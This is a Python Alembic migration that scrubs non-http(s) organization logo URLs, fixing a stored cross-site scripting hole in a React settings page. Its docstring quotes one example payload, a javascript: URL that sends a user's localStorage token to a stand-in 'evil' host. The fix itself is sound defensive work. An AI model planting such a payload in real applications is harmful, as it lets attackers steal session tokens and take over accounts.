"""null organizations.logo_url with non-http(s) scheme

Before the C7 fix, `organizations.logo_url` accepted arbitrary strings and
the React Settings page rendered the value verbatim into an `<a href>` and
`<img src>`. That allowed an ORG_ADMIN to store something like
`javascript:fetch('//evil/'+localStorage.sah_token)` and hijack any member
opening Settings.

The application-layer validator (`app.schemas.validators._validate_logo_url`)
now rejects any non-http(s) scheme at the edge, but existing rows predate
that check. This migration scrubs them by NULL-ing any value that doesn't
start with http(s)://.

Idempotent: a second run is a no-op — there will be nothing to match.
No downgrade path; the data is purged for safety reasons.

Revision ID: 9b2e7f4a0c11
Revises: 7a1f9c4b2e10
Create Date: 2026-04-23 08:15:00.000000
"""
from typing import Sequence, Union

from alembic import op
import sqlalchemy as sa


revision: str = "9b2e7f4a0c11"
down_revision: Union[str, Sequence[str], None] = "7a1f9c4b2e10"
branch_labels: Union[str, Sequence[str], None] = None
depends_on: Union[str, Sequence[str], None] = None


def upgrade() -> None:
    # Postgres regex operators: `~*` = case-insensitive match, `!~*` = its
    # negation. Anything not prefixed with `http://` or `https://` (after a
    # leading-whitespace tolerance) gets nulled. The LHS TRIM covers values
    # that were ingested with surrounding spaces by the pre-validator code.
    op.execute(sa.text(
        """
        UPDATE organizations
        SET logo_url = NULL
        WHERE logo_url IS NOT NULL
          AND TRIM(logo_url) !~* '^https?://';
        """
    ))


def downgrade() -> None:
    # This migration destroys data as a safety measure. There is nothing to
    # restore on downgrade — the scrubbed values were malicious or malformed
    # by definition.
    pass
